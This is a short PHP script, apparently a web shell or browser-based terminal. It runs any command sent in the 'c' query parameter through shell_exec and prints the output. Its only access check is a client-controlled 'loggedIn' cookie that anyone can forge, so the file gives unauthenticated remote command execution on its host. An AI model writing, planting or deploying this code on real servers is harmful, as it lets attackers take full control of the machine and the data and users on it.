<?php
	//if loggedIn in cookie is set and equals true then this script can be used
	if (isset($_COOKIE['loggedIn']) && $_COOKIE['loggedIn'] == true ) {
		
		$command = $_GET["c"];
	
		$shellResponse = shell_exec($command);
		
		if ($shellResponse == '') {
			$shellResponse = $command . ' : command not found';	
		}
		
		echo $shellResponse;
	}
?>